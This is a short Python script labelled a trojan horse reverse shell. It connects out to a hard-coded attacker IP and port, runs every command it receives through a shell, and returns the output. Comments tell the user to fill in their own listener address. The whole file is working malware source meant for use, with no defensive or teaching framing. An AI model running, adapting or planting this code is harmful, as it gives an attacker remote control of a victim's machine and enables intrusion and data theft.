import socket
import subprocess
import os

# Trojan Horse - Reverse Shell
# Attacker IP and port
HOST = "192.168.0.226"  # Replace with your IP
PORT = 4444             # Replace with your listening port

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command.strip("cd "))
                s.send(b"Changed directory")
            except FileNotFoundError:
                s.send(b"Directory not found")
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            s.send(stdout + stderr)
    s.close()

if __name__ == "__main__":
    connect()
